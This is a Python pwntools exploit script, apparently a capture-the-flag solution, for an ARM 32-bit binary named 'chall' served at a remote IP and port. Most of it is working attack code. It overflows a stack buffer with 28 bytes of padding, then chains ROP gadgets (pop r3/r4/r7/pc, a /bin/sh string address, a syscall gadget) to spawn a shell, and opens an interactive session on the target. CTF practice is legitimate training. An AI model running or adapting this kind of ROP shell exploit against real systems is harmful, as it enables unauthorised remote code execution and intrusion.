#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall --host 137.184.6.25 --port 17002
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '137.184.6.25'
port = int(args.PORT or 17002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        io = process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", exe.path] + argv, *a, **kw)
        gdb.attach(("127.0.0.1", 1234), gdbscript=gdbscript, exe=exe.path)
    else:
        io = process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabihf", exe.path] + argv, *a, **kw)
    return io

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set sysroot /usr/arm-linux-gnueabihf/
tbreak main
init-pwndbg
continue
'''.format(**locals())

# context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     arm-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x10000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

pop_r3_r4_r7_pc = 0x00010527
bin_sh = 0x0001062c
syscall_r3 = 0x0001055a

padding = 28
payload = flat([
    cyclic(padding),
    pop_r3_r4_r7_pc,
    bin_sh,
    pop_r3_r4_r7_pc,
    bin_sh,
    syscall_r3,
    0xdeadbeef
])
io.sendline(payload)

io.interactive()

